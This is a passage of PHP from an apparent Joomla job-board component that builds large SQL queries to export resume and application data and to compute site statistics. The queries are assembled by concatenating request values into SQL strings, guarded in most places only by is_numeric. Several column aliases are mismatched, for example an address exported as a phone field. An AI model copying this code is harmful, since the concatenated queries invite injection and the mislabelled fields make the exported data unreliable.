                            resume.employer3_pay_upon_leaving AS employer3_pay_upon_leaving,resume.employer3_supervisor AS employer3_supervisor,resume.employer3_from_date AS employer3_from_date,resume.employer3_to_date AS employer3_to_date,resume.employer3_leave_reason AS employer3_leave_reason,resume.employer3_country AS employer3_country,resume.employer3_state AS employer3_state,
                            resume.employer3_city AS employer3_city,resume.employer3_zip AS employer3_zip,resume.employer3_address AS employer3_phone,
                            resume.language_reading AS langugage_reading,
                            resume.language_writing AS langugage_writing,resume.language_understanding AS langugage_undarstanding,resume.language_where_learned AS langugage_where_learned,resume.language1 AS language1,
                            resume.language1_reading AS langugage1_reading,resume.language1_writing AS langugage1_writing,resume.language1_understanding AS langugage1_undarstanding,resume.language1_where_learned AS langugage1_where_learned,resume.language2 AS language2,resume.language2_reading AS langugage2_reading,resume.language2_writing AS langugage2_writing,resume.language2_understanding AS langugage2_undarstanding,
                            resume.language2_where_learned AS langugage2_where_learned,resume.language3 AS language3,resume.language3_reading AS langugage3_reading,resume.language3_writing AS langugage3_writing,resume.language3_understanding AS langugage3_undarstanding,resume.language3_where_learned AS langugage3_where_learned,resume.date_start AS date_start,resume.desired_salary AS desired_salary,resume.can_work AS can_work,
                            resume.available AS available,resume.unalailable AS unalailable,resume.total_experience AS total_experience,resume.skills AS skills,resume.driving_license AS driving_license,resume.license_no AS license_no,resume.license_country AS license_country,resume.reference AS reference,resume.reference_name AS reference_name,resume.reference_country AS reference_country,resume.reference_state AS reference_state,
                            resume.reference_city AS reference_city,resume.reference_zipcode AS reference_zipcode,resume.reference_address AS reference_address,resume.reference_phone AS reference_phone,resume.reference_relation AS reference_relation,resume.reference_years AS reference_years,resume.reference1 AS reference1,resume.reference1_name AS reference1_name,
                            resume.reference1_country AS reference1_country,resume.reference1_state AS reference1_state,resume.reference1_city AS reference1_city,resume.reference1_address AS reference1_address,resume.reference1_phone AS reference1_phone,resume.reference1_relation AS reference1_relation,resume.reference1_years AS reference1_years,resume.reference2 AS reference2,resume.reference2_name AS reference2_name,
                            resume.reference2_country AS reference2_country,resume.reference2_state AS reference2_state,resume.reference2_city AS reference2_city,resume.reference2_address AS reference2_address,resume.reference2_phone AS reference2_phone,resume.reference2_relation AS reference2_relation,resume.reference2_years AS reference2_years,resume.reference3 AS reference3,
                            resume.reference3_name AS reference3_name,resume.reference3_country AS reference3_country,resume.reference3_state AS reference3_state,resume.reference3_city AS reference3_city,resume.reference3_address AS reference3_address,resume.reference3_phone AS reference3_phone,
                            resume.reference3_relation AS reference3_relation,resume.reference3_years AS reference3_years,resume.address1_country AS address1_country,resume.address1_state AS address1_state,resume.address1_city AS address1_city,resume.address1_zipcode AS address1_zipcode,
                            resume.address1 AS address1,resume.address2_country AS address2_country,resume.address2_state AS address2_state,resume.address2_city AS address2_city,resume.address2_zipcode AS address2_zipcode,resume.address2 AS address2,resume.reference1_zipcode AS reference1_zipcode,resume.reference2_zipcode AS reference2_zipcode,resume.reference3_zipcode AS reference3_zipcode,resume.packageid AS packageid,resume.paymenthistoryid AS paymenthistoryid,resume.status AS status,
                            totalexperience.title AS totalexperience
                                FROM `#__js_job_resume` AS resume
                                JOIN `#__js_job_categories` AS cat ON resume.job_category = cat.id
                                JOIN `#__js_job_jobtypes` AS jobtype ON resume.jobtype = jobtype.id
                                JOIN `#__js_job_jobapply` AS applyjob ON applyjob.cvid = resume.id
								LEFT JOIN `#__js_job_experiences` AS totalexperience ON resume.total_experience = totalexperience.id
                                LEFT JOIN `#__js_job_heighesteducation` AS heighesteducation ON resume.heighestfinisheducation = heighesteducation.id
                                LEFT JOIN `#__js_job_countries` AS nationality_country ON resume.nationality = nationality_country.id
                                LEFT JOIN `#__js_job_salaryrange` AS salary ON resume.jobsalaryrange = salary.id
                                LEFT JOIN `#__js_job_cities` AS address_city ON resume.address_city = address_city.id
                                LEFT JOIN `#__js_job_states` AS address_state ON address_city.stateid = address_state.id
                                LEFT JOIN `#__js_job_countries` AS address_country ON address_city.countryid = address_country.id
                                LEFT JOIN `#__js_job_cities` AS address1_city ON resume.address1_city = address1_city.id
                                LEFT JOIN `#__js_job_states` AS address1_state ON address1_city.stateid = address1_state.id
                                LEFT JOIN `#__js_job_countries` AS address1_country ON address1_city.countryid = address1_country.id
                                LEFT JOIN `#__js_job_cities` AS address2_city ON resume.address2_city = address2_city.id
                                LEFT JOIN `#__js_job_states` AS address2_state ON address2_city.stateid = address2_state.id
                                LEFT JOIN `#__js_job_countries` AS address2_country ON address2_city.countryid = address2_country.id
                                LEFT JOIN `#__js_job_cities` AS institute_city ON resume.institute_city = institute_city.id
                                LEFT JOIN `#__js_job_states` AS institute_state ON institute_city.stateid = institute_state.id
                                LEFT JOIN `#__js_job_countries` AS institute_country ON institute_city.countryid = institute_country.id
                                LEFT JOIN `#__js_job_cities` AS  institute1_city ON resume.institute1_city = institute1_city.id
                                LEFT JOIN `#__js_job_states` AS institute1_state ON institute1_city.stateid = institute1_state.id
                                LEFT JOIN `#__js_job_countries` AS institute1_country ON institute1_city.countryid = institute1_country.id
                                LEFT JOIN `#__js_job_cities` AS institute2_city ON resume.institute2_city = institute2_city.id
                                
                                LEFT JOIN `#__js_job_states` AS institute2_state ON institute2_city.stateid = institute2_state.id
                                LEFT JOIN `#__js_job_countries` AS institute2_country ON institute2_city.countryid = institute2_country.id
                                LEFT JOIN `#__js_job_cities` AS institute3_city ON resume.institute3_city = institute3_city.id
                                
                                LEFT JOIN `#__js_job_states` AS institute3_state ON institute3_city.stateid = institute3_state.id
                                LEFT JOIN `#__js_job_countries` AS institute3_country ON institute3_city.countryid = institute3_country.id
                                LEFT JOIN `#__js_job_cities` AS employer_city ON resume.employer_city = employer_city.id
                                
                                LEFT JOIN `#__js_job_states` AS employer_state ON employer_city.stateid = employer_state.id
                                LEFT JOIN `#__js_job_countries` AS employer_country ON employer_city.countryid = employer_country.id
                                LEFT JOIN `#__js_job_cities` AS employer1_city ON resume.employer1_city = employer1_city.id
                                
                                LEFT JOIN `#__js_job_states` AS employer1_state ON employer1_city.stateid = employer1_state.id
                                LEFT JOIN `#__js_job_countries` AS employer1_country ON employer1_city.countryid = employer1_country.id
                                LEFT JOIN `#__js_job_cities` AS employer2_city ON resume.employer2_city = employer2_city.id
                                
                                LEFT JOIN `#__js_job_states` AS employer2_state ON employer2_city.stateid = employer2_state.id
                                LEFT JOIN `#__js_job_countries` AS employer2_country ON employer2_city.countryid = employer2_country.id
                                LEFT JOIN `#__js_job_cities` AS employer3_city ON resume.employer3_city = employer3_city.id
                                
                                LEFT JOIN `#__js_job_states` AS employer3_state ON employer3_city.stateid = employer3_state.id
                                LEFT JOIN `#__js_job_countries` AS employer3_country ON employer3_city.countryid = employer3_country.id
                                LEFT JOIN `#__js_job_cities` AS reference_city ON resume.reference_city = reference_city.id
                                
                                LEFT JOIN `#__js_job_states` AS reference_state ON reference_city.stateid = reference_state.id
                                LEFT JOIN `#__js_job_countries` AS reference_country ON reference_city.countryid = reference_country.id
                                LEFT JOIN `#__js_job_cities` AS reference1_city ON resume.reference1_city = reference1_city.id
                                
                                LEFT JOIN `#__js_job_states` AS reference1_state ON reference1_city.stateid = reference1_state.id
                                LEFT JOIN `#__js_job_countries` AS reference1_country ON reference1_city.countryid = reference1_country.id
                                WHERE applyjob.jobid =" . $jobid;
        $db->setQuery($query);
        $resume = $db->loadObject();
        return $resume;
    }

    function getExportResumes($jobid, $resumeid) {
        if(!is_numeric($jobid)) return false;
        if(!is_numeric($resumeid)) return false;
        $db = &$this->getDBO();
        $query = "SELECT resume.*,applyjob.apply_date AS apply_date,applyjob.comments AS comments,cat.cat_title AS categorytitle,salary.rangestart AS rangestart,salary.rangeend AS rangeend,jobtype.title AS jobtypetitle,heighesteducation.title AS heighesteducationtitle,
						nationality_country.name AS nationalitycountry,address_city.name AS address_city2,address_state.name AS address_state2,
						address_country.name AS address_country2,address1_city.name AS address1_city2,address1_state.name AS address1_state2,
						address1_country.name AS address1_country2,address2_city.name AS address2_city2,address2_state.name AS address2_state2,
						address2_country.name AS address2_country2,institute_city.name AS institute_city2,institute_state.name AS institute_state2,
						institute_country.name AS institute_country2,institute1_city.name AS institute1_city2,institute1_state.name AS institute1_state2,
						institute1_country.name AS institute1_country2,institute2_city.name AS institute2_city2,institute2_state.name AS institute2_state2,
						institute2_country.name AS institute2_country2,institute3_city.name AS institute3_city2,institute3_state.name AS institute3_state2,
						institute3_country.name AS institute3_country2,employer_city.name AS employer_city2,employer_state.name AS employer_state2,
						employer_country.name AS employer_country2,employer1_city.name AS employer1_city2,employer1_state.name AS employer1_state2,
						employer1_country.name AS employer1_country2,employer2_city.name AS employer2_city2,employer2_state.name AS employer2_state2,
						employer2_country.name AS employer2_country2,employer3_city.name AS employer3_city2,employer3_state.name AS employer3_state2,
						employer3_country.name AS employer3_country2,reference_city.name AS reference_city2,reference_state.name AS reference_state2,
						reference_country.name AS reference_country2,reference1_city.name AS reference1_city2,reference1_state.name AS reference1_state2,
						reference1_country.name AS reference1_country2,resume.id AS id,resume.uid AS uid,resume.application_title AS application_title,resume.first_name AS first_name,
						resume.last_name AS last_name,resume.middle_name AS middle_name,resume.gender AS gender,resume.email_address AS email_address,resume.home_phone AS home_phone,resume.work_phone AS work_phone,
						resume.cell AS cell,resume.nationality AS iamavailable,resume.searchable AS searchable,resume.photo AS photo,resume.job_category AS job_category,resume.jobsalaryrange AS jobsalaryrange,
						resume.jobtype AS jobtype,resume.heighestfinisheducation AS heighestfinisheducation,resume.address_country AS address_country,resume.address_state AS address_state,resume.address_city AS address_city,
						resume.address_zipcode AS address_zipcode,resume.address AS address,resume.institute AS institute,resume.institute_country AS institute_country,resume.institute_state AS institute_state,
						resume.institute_city AS institute_city,resume.institute_address AS institute_address,resume.institute_certificate_name AS institute_certificate_name,
						resume.institute_study_area AS institute_study_area,resume.employer AS employer,resume.employer_position AS employer_position,resume.employer_resp AS employer_resp,resume.employer_pay_upon_leaving AS employer_pay_upon_leaving,
						resume.employer_supervisor AS employer_supervisor,resume.employer_from_date AS employer_from_date,resume.employer_to_date AS employer_to_date,resume.employer_leave_reason AS employer_leave_reason,resume.employer_country AS employer_country,
						resume.employer_state AS employer_state,resume.employer_city AS employer_city,resume.employer_zip AS employer_zip,resume.employer_phone AS employer_phone,resume.employer_address AS employer_address,
						resume.institute1 AS institute1,resume.institute1_country AS institute1_country,resume.institute1_state AS institute1_state,resume.institute1_city AS institute1_city,resume.institute1_address AS institute1_address,
						resume.institute1_certificate_name AS institute1_certificate_name,resume.institute1_study_area AS institute2,resume.institute2_country AS institute2_country,resume.institute2_state AS institute2_state,resume.institute2_city AS institute2_city,
						resume.institute2_address AS institute2_address,resume.institute2_certificate_name AS institute2_certificate_name,resume.institute2_study_area AS institute2_study_area,resume.institute3 AS institute3,resume.institute3_country AS institute3_country,resume.institute3_state AS institute3_state,
						resume.institute3_city AS institute3_city,resume.institute3_address AS institute3_address,resume.institute3_study_area AS institute3_study_area,resume.institute3_certificate_name AS employer1,resume.employer1_position AS employer1_position,
						resume.employer1_resp AS employer1_resp,resume.employer1_pay_upon_leaving AS employer1_pay_upon_leaving,resume.employer1_supervisor AS employer1_supervisor,resume.employer1_from_date AS employer1_from_date,resume.employer1_to_date AS employer1_to_date,resume.employer1_leave_reason AS employer1_country,
						resume.employer1_state AS employer1_state,resume.employer1_city AS employer1_city,resume.employer1_zip AS employer1_zip,resume.employer1_phone AS employer1_phone,resume.employer1_address AS employer1_address,resume.employer2 AS employer2,resume.employer2_position AS employer2_position,
						resume.employer2_resp AS employer2_resp,resume.employer2_pay_upon_leaving AS employer2_pay_upon_leaving,resume.employer2_supervisor AS employer2_supervisor,resume.employer2_from_date AS employer2_from_date,resume.employer2_to_date AS employer2_to_date,resume.employer2_leave_reason AS employer2_leave_reason,resume.employer2_country AS employer2_country,
						resume.employer2_state AS employer2_state,resume.employer2_city AS employer2_city,resume.employer2_zip AS employer2_zip,resume.employer2_address AS employer2_address,resume.employer2_phone AS employer2_phone,resume.employer3 AS employer3,resume.employer3_position AS employer3_position,resume.employer3_resp AS employer3_resp,
						resume.employer3_pay_upon_leaving AS employer3_pay_upon_leaving,resume.employer3_supervisor AS employer3_supervisor,resume.employer3_from_date AS employer3_from_date,resume.employer3_to_date AS employer3_to_date,resume.employer3_leave_reason AS employer3_leave_reason,resume.employer3_country AS employer3_country,resume.employer3_state AS employer3_state,
						resume.employer3_city AS employer3_city,resume.employer3_zip AS employer3_zip,resume.employer3_address AS employer3_phone,
						resume.language_reading AS langugage_reading,
						resume.language_writing AS langugage_writing,resume.language_understanding AS langugage_undarstanding,resume.language_where_learned AS langugage_where_learned,resume.language1 AS language1,
						resume.language1_reading AS langugage1_reading,resume.language1_writing AS langugage1_writing,resume.language1_understanding AS langugage1_undarstanding,resume.language1_where_learned AS langugage1_where_learned,resume.language2 AS language2,resume.language2_reading AS langugage2_reading,resume.language2_writing AS langugage2_writing,resume.language2_understanding AS langugage2_undarstanding,
						resume.language2_where_learned AS langugage2_where_learned,resume.language3 AS language3,resume.language3_reading AS langugage3_reading,resume.language3_writing AS langugage3_writing,resume.language3_understanding AS langugage3_undarstanding,resume.language3_where_learned AS langugage3_where_learned,resume.date_start AS date_start,resume.desired_salary AS desired_salary,resume.can_work AS can_work,
						resume.available AS available,resume.unalailable AS unalailable,resume.total_experience AS total_experience,resume.skills AS skills,resume.driving_license AS driving_license,resume.license_no AS license_no,resume.license_country AS license_country,resume.reference AS reference,resume.reference_name AS reference_name,resume.reference_country AS reference_country,resume.reference_state AS reference_state,
						resume.reference_city AS reference_city,resume.reference_zipcode AS reference_zipcode,resume.reference_address AS reference_address,resume.reference_phone AS reference_phone,resume.reference_relation AS reference_relation,resume.reference_years AS reference_years,resume.reference1 AS reference1,resume.reference1_name AS reference1_name,
						resume.reference1_country AS reference1_country,resume.reference1_state AS reference1_state,resume.reference1_city AS reference1_city,resume.reference1_address AS reference1_address,resume.reference1_phone AS reference1_phone,resume.reference1_relation AS reference1_relation,resume.reference1_years AS reference1_years,resume.reference2 AS reference2,resume.reference2_name AS reference2_name,
						resume.reference2_country AS reference2_country,resume.reference2_state AS reference2_state,resume.reference2_city AS reference2_city,resume.reference2_address AS reference2_address,resume.reference2_phone AS reference2_phone,resume.reference2_relation AS reference2_relation,resume.reference2_years AS reference2_years,resume.reference3 AS reference3,
						resume.reference3_name AS reference3_name,resume.reference3_country AS reference3_country,resume.reference3_state AS reference3_state,resume.reference3_city AS reference3_city,resume.reference3_address AS reference3_address,resume.reference3_phone AS reference3_phone,
						resume.reference3_relation AS reference3_relation,resume.reference3_years AS reference3_years,resume.address1_country AS address1_country,resume.address1_state AS address1_state,resume.address1_city AS address1_city,resume.address1_zipcode AS address1_zipcode,
						resume.address1 AS address1,resume.address2_country AS address2_country,resume.address2_state AS address2_state,resume.address2_city AS address2_city,resume.address2_zipcode AS address2_zipcode,resume.address2 AS address2,resume.reference1_zipcode AS reference1_zipcode,resume.reference2_zipcode AS reference2_zipcode,resume.reference3_zipcode AS reference3_zipcode,resume.packageid AS packageid,resume.paymenthistoryid AS paymenthistoryid,resume.status AS status,
						totalexperience.title AS totalexperience
							FROM `#__js_job_resume` AS resume
							JOIN `#__js_job_categories` AS cat ON resume.job_category = cat.id
							JOIN `#__js_job_jobtypes` AS jobtype ON resume.jobtype = jobtype.id
							JOIN `#__js_job_jobapply` AS applyjob ON applyjob.jobid = " . $jobid . " AND applyjob.cvid=" . $resumeid . "
							LEFT JOIN `#__js_job_experiences` AS totalexperience ON resume.total_experience = totalexperience.id
							LEFT JOIN `#__js_job_heighesteducation` AS heighesteducation ON resume.heighestfinisheducation = heighesteducation.id
							LEFT JOIN `#__js_job_countries` AS nationality_country ON resume.nationality = nationality_country.id
							LEFT JOIN `#__js_job_salaryrange` AS salary ON resume.jobsalaryrange = salary.id
							LEFT JOIN `#__js_job_cities` AS address_city ON resume.address_city = address_city.id
							LEFT JOIN `#__js_job_states` AS address_state ON address_city.stateid = address_state.id
							LEFT JOIN `#__js_job_countries` AS address_country ON address_city.countryid = address_country.id
							LEFT JOIN `#__js_job_cities` AS address1_city ON resume.address1_city = address1_city.id
							LEFT JOIN `#__js_job_states` AS address1_state ON address1_city.stateid = address1_state.id
							LEFT JOIN `#__js_job_countries` AS address1_country ON address1_city.countryid = address1_country.id
							LEFT JOIN `#__js_job_cities` AS address2_city ON resume.address2_city = address2_city.id
							LEFT JOIN `#__js_job_states` AS address2_state ON address2_city.stateid = address2_state.id
							LEFT JOIN `#__js_job_countries` AS address2_country ON address2_city.countryid = address2_country.id
							LEFT JOIN `#__js_job_cities` AS institute_city ON resume.institute_city = institute_city.id
							LEFT JOIN `#__js_job_states` AS institute_state ON institute_city.stateid = institute_state.id
							LEFT JOIN `#__js_job_countries` AS institute_country ON institute_city.countryid = institute_country.id
							LEFT JOIN `#__js_job_cities`  institute1_city ON resume.institute1_city = institute1_city.id
							LEFT JOIN `#__js_job_states` AS institute1_state ON institute1_city.stateid = institute1_state.id
							LEFT JOIN `#__js_job_countries` AS institute1_country ON institute1_city.countryid = institute1_country.id
							LEFT JOIN `#__js_job_cities` AS institute2_city ON resume.institute2_city = institute2_city.id
							
							LEFT JOIN `#__js_job_states` AS institute2_state ON institute2_city.stateid = institute2_state.id
							LEFT JOIN `#__js_job_countries` AS institute2_country ON institute2_city.countryid = institute2_country.id
							LEFT JOIN `#__js_job_cities` AS institute3_city ON resume.institute3_city = institute3_city.id
							
							LEFT JOIN `#__js_job_states` AS institute3_state ON institute3_city.stateid = institute3_state.id
							LEFT JOIN `#__js_job_countries` AS institute3_country ON institute3_city.countryid = institute3_country.id
							LEFT JOIN `#__js_job_cities` AS employer_city ON resume.employer_city = employer_city.id
							
							LEFT JOIN `#__js_job_states` AS employer_state ON employer_city.stateid = employer_state.id
							LEFT JOIN `#__js_job_countries` AS employer_country ON employer_city.countryid = employer_country.id
							LEFT JOIN `#__js_job_cities` AS employer1_city ON resume.employer1_city = employer1_city.id
							
							LEFT JOIN `#__js_job_states` AS employer1_state ON employer1_city.stateid = employer1_state.id
							LEFT JOIN `#__js_job_countries` AS employer1_country ON employer1_city.countryid = employer1_country.id
							LEFT JOIN `#__js_job_cities` AS employer2_city ON resume.employer2_city = employer2_city.id
							
							LEFT JOIN `#__js_job_states` AS employer2_state ON employer2_city.stateid = employer2_state.id
							LEFT JOIN `#__js_job_countries` AS employer2_country ON employer2_city.countryid = employer2_country.id
							LEFT JOIN `#__js_job_cities` AS employer3_city ON resume.employer3_city = employer3_city.id
							
							LEFT JOIN `#__js_job_states` AS employer3_state ON employer3_city.stateid = employer3_state.id
							LEFT JOIN `#__js_job_countries` AS employer3_country ON employer3_city.countryid = employer3_country.id
							LEFT JOIN `#__js_job_cities` AS reference_city ON resume.reference_city = reference_city.id
							
							LEFT JOIN `#__js_job_states` AS reference_state ON reference_city.stateid = reference_state.id
							LEFT JOIN `#__js_job_countries` AS reference_country ON reference_city.countryid = reference_country.id
							LEFT JOIN `#__js_job_cities` AS reference1_city ON resume.reference1_city = reference1_city.id
							
							LEFT JOIN `#__js_job_states` AS reference1_state ON reference1_city.stateid = reference1_state.id
							LEFT JOIN `#__js_job_countries` AS reference1_country ON reference1_city.countryid = reference1_country.id
							WHERE resume.id =" . $resumeid;
        $db->setQuery($query);
        $resume = $db->loadObject();
        return $resume;
    }
	function & getCountybyId($c_id)
	{
		if (is_numeric($c_id) == false) return false;
		$db = & JFactory :: getDBO();
		$query = "SELECT * FROM #__js_job_counties WHERE id = ".$c_id;
		$db->setQuery($query);
		$county = $db->loadObject();
		return $county;
	}

    function & getCitybyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_cities WHERE id = " . $c_id;
        $db->setQuery($query);
        $city = $db->loadObject();
        return $city;
    }

    function & getUserStatsResumes($resumeuid, $limitstart, $limit) {
        if (is_numeric($resumeuid) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = 'SELECT COUNT(resume.id) FROM #__js_job_resume AS resume WHERE resume.uid = ' . $resumeuid;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = 'SELECT resume.id,resume.application_title,resume.first_name,resume.last_name,cat.cat_title,resume.create_date,resume.status
                    FROM #__js_job_resume AS resume
                    LEFT JOIN #__js_job_categories AS cat ON cat.id=resume.job_category
                    WHERE resume.uid = ' . $resumeuid;
        $query .= ' ORDER BY resume.first_name';
        $db->setQuery($query, $limitstart, $limit);
        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getJSJobsStats() {
        $db = & JFactory :: getDBO();
        $result = array();

        $query = 'SELECT count(id) AS totalcompanies,(SELECT count(company.id) FROM #__js_job_companies AS company WHERE company.status=1 ) AS activecompanies
		FROM #__js_job_companies ';
        $db->setQuery($query);
        $companies = $db->loadObject();

        $query = 'SELECT count(id) AS totaljobs,(SELECT count(job.id) FROM #__js_job_jobs AS job WHERE job.status=1 AND job.stoppublishing >= CURDATE())  AS activejobs
		FROM #__js_job_jobs ';
        $db->setQuery($query);
        $jobs = $db->loadObject();

        $query = 'SELECT count(id) AS totalresumes,(SELECT count(resume.id) FROM #__js_job_resume AS resume WHERE resume.status=1 ) AS activeresumes
		FROM #__js_job_resume ';
        $db->setQuery($query);
        $resumes = $db->loadObject();

        $query = "SELECT (SELECT COUNT(id) FROM #__js_job_companies WHERE isfeaturedcompany=1) AS totalfeaturedcompanies,
				(SELECT count(featuredcompany.id) FROM #__js_job_companies  AS featuredcompany
				JOIN  #__js_job_employerpackages AS package ON package.id=featuredcompany.packageid
				WHERE  featuredcompany.status=1 AND featuredcompany.isfeaturedcompany=1  AND DATE_ADD(featuredcompany.startfeatureddate,INTERVAL package.featuredcompaniesexpireindays DAY) >= CURDATE() ) AS activefeaturedcompanies
		FROM #__js_job_companies ";
        $db->setQuery($query);
        $featuredcompanies = $db->loadObject();
        $query = "SELECT ( SELECT COUNT(id) FROM #__js_job_companies WHERE isgoldcompany=1) AS totalgoldcompanies,(SELECT count(goldcompany.id) FROM #__js_job_companies  AS goldcompany
		JOIN  #__js_job_employerpackages AS package ON package.id=goldcompany.packageid
		WHERE  goldcompany.status= 1 AND goldcompany.isgoldcompany=1 AND DATE_ADD(goldcompany.startgolddate,INTERVAL package.goldcompaniesexpireindays DAY) >= CURDATE() )AS activegoldcompanies
		";
        $db->setQuery($query);
        $goldcompanies = $db->loadObject();

        $query = "SELECT ( SELECT COUNT(id) FROM #__js_job_jobs WHERE isfeaturedjob=1 ) AS totalfeaturedjobs,(SELECT count(featuredjob.id) FROM #__js_job_jobs AS featuredjob
		JOIN  #__js_job_employerpackages AS package ON package.id=featuredjob.packageid
		WHERE  featuredjob.status= 1 AND featuredjob.isfeaturedjob= 1  AND DATE_ADD(featuredjob.created,INTERVAL package.featuredjobsexpireindays DAY) >= CURDATE() ) AS activefeaturedjobs
		";
        $db->setQuery($query);
        $featuredjobs = $db->loadObject();

        $query = "SELECT ( SELECT COUNT(id) FROM #__js_job_jobs WHERE isgoldjob=1) AS totalgoldjobs,(SELECT count(goldjob.id) FROM #__js_job_jobs  AS goldjob
		JOIN  #__js_job_employerpackages AS package ON package.id=goldjob.packageid
		WHERE  goldjob.status= 1 AND goldjob.isgoldjob=1  AND DATE_ADD(goldjob.created,INTERVAL package.goldjobsexpireindays DAY) >= CURDATE() ) AS activegoldjobs
		";
        $db->setQuery($query);
        $goldjobs = $db->loadObject();

        $query = "SELECT ( SELECT COUNT(id) FROM #__js_job_resume WHERE isfeaturedresume=1 ) AS totalfeaturedresumes,(SELECT count(featuredresume.id) FROM #__js_job_resume  AS featuredresume
		JOIN  #__js_job_jobseekerpackages AS package ON package.id=featuredresume.packageid
		WHERE  featuredresume.status= 1 AND featuredresume.isfeaturedresume= 1  AND DATE_ADD(featuredresume.create_date,INTERVAL package.freaturedresumeexpireindays DAY) >= CURDATE() ) AS activefeaturedresumes
		";
        $db->setQuery($query);
        $featuredresumes = $db->loadObject();

        $query = "SELECT ( SELECT COUNT(id) FROM #__js_job_resume WHERE isgoldresume=1 ) AS totalgoldresumes,(SELECT count(goldresume.id) FROM #__js_job_resume  AS goldresume
		JOIN  #__js_job_jobseekerpackages AS package ON package.id=goldresume.packageid
		WHERE  goldresume.status= 1  AND goldresume.isgoldresume= 1  AND DATE_ADD(goldresume.create_date,INTERVAL package.goldresumeexpireindays DAY) >= CURDATE() ) AS activegoldresumes
		";
        $db->setQuery($query);
        $goldresumes = $db->loadObject();

        $query = "SELECT (SELECT SUM(paidamount) FROM #__js_job_paymenthistory WHERE  status=1 and packagefor=1) + (SELECT SUM(paidamount) FROM #__js_job_paymenthistory WHERE  status=1 and packagefor=2)  AS totalpaidamount ";
        $db->setQuery($query);
        $totalpaidamount = $db->loadObject();

        $query = 'SELECT count(userrole.id) AS totalemployer
                    FROM #__users AS a
                    JOIN #__js_job_userroles AS userrole ON userrole.uid=a.id
                    WHERE userrole.role=1';
        $db->setQuery($query);
        $totalemployer = $db->loadObject();

        $query = 'SELECT count(userrole.id) AS totaljobseeker
                    FROM #__users AS a
                    JOIN #__js_job_userroles AS userrole ON userrole.uid=a.id
                    WHERE userrole.role=2';
        $db->setQuery($query);
        $totaljobseeker = $db->loadObject();

        $result[0] = $companies;
        $result[1] = $jobs;
        $result[2] = $resumes;
        $result[3] = $featuredcompanies;
        $result[4] = $goldcompanies;
        $result[5] = $featuredjobs;
        $result[6] = $goldjobs;
        $result[7] = $featuredresumes;
        $result[8] = $goldresumes;
        $result[9] = $totalpaidamount;
        $result[10] = $totalemployer;
        $result[11] = $totaljobseeker;
        return $result;
    }

    function & getUserFields($fieldfor, $limitstart, $limit) {
        if (is_numeric($fieldfor) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = 'SELECT COUNT(id) FROM #__js_job_userfields WHERE fieldfor = ' . $fieldfor;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = 'SELECT field.* FROM #__js_job_userfields AS field WHERE fieldfor = ' . $fieldfor;
        $query .= ' ORDER BY field.id';

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $result[0] = $this->_application;
        $result[1] = $total;
        return $result;
    }

    function & getFieldsOrdering($fieldfor, $limitstart, $limit) {
        if (is_numeric($fieldfor) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = 'SELECT COUNT(id) FROM #__js_job_fieldsordering WHERE fieldfor = ' . $fieldfor;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = 'SELECT field.* ,userfield.title as userfieldtitle
					FROM #__js_job_fieldsordering AS field
					LEFT JOIN #__js_job_userfields AS userfield ON field.field = userfield.id
					WHERE field.fieldfor = ' . $fieldfor;
        $query .= ' ORDER BY';
        if ($fieldfor == 3)
            $query .=' field.section,';
        $query .= ' field.ordering';
        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function &getUserFieldsforForm($fieldfor, $refid) {
        if (is_numeric($fieldfor) == false)
            return false;
        if ($refid)
            if (is_numeric($refid) == false)
                return false;
        $db = &$this->getDBO();
        $field = array();
        $result = array();
        $query = "SELECT  * FROM `#__js_job_userfields`
					WHERE published = 1 AND fieldfor = " . $fieldfor;
        $db->setQuery($query);
        $rows = $db->loadObjectList();

        $i = 0;
        foreach ($rows as $row) {
            //$result[$i] = $row;
            $field[0] = $row;
            if ($refid != "") {
                $query = "SELECT  * FROM `#__js_job_userfield_data` WHERE referenceid = " . $refid . " AND field = " . $row->id;
                $db->setQuery($query);
                $data = $db->loadObject();
                $field[1] = $data;
            }
            if ($row->type == "select") {
                $query = "SELECT  * FROM `#__js_job_userfieldvalues` WHERE field = " . $row->id;
                $db->setQuery($query);
                $values = $db->loadObjectList();
                $field[2] = $values;
            }
            $result[] = $field;
            $i++;
        }
        return $result;
    }

    function &getFieldsOrderingforForm($fieldfor) {
        if (is_numeric($fieldfor) == false)
            return false;
        $db = &$this->getDBO();
        $query = "SELECT  * FROM `#__js_job_fieldsordering`
					WHERE published = 1 AND fieldfor =  " . $fieldfor
                . " ORDER BY ordering";
        $db->setQuery($query);
        $fieldordering = $db->loadObjectList();
        return $fieldordering;
    }

    function &getConfig() {
        if (isset($this->_config) == false) {
            $db = &$this->getDBO();
            $query = "SELECT * FROM `#__js_job_config`";
            $db->setQuery($query);
            $this->_config = $db->loadObjectList();
            foreach ($this->_config as $conf) {
                if ($conf->configname == "defaultcountry") {
                    $this->_defaultcountry = $conf->configvalue;
                } elseif ($conf->configname == "job_editor")
                    $this->_job_editor = $conf->configvalue;
                elseif ($conf->configname == "comp_editor")
                    $this->_comp_editor = $conf->configvalue;
                elseif ($conf->configname == "data_directory")
                    $this->_data_directory = $conf->configvalue;
            }
        }
        return $this->_config;
    }

    function &getConfigurationsForForm() {
        if (isset($this->_config) == false) {
            $db = &$this->getDBO();
            $query = "SELECT * FROM `#__js_job_config`";
            $db->setQuery($query);
            $this->_config = $db->loadObjectList();
        }
        foreach ($this->_config as $conf) {
            if ($conf->configname == "defaultcountry") {
                $this->_defaultcountry = $conf->configvalue;
            } elseif ($conf->configname == "employer_defaultpackage")
                $employer_defaultpackage = $conf->configvalue;
            elseif ($conf->configname == "jobseeker_defaultpackage")
                $jobseeker_defaultpackage = $conf->configvalue;
            elseif ($conf->configname == "data_directory")
                $this->_data_directory = $conf->configvalue;
            elseif ($conf->configname == "jobseeker_defaultgroup")
                $jobseeker_defaultgroup = $conf->configvalue;
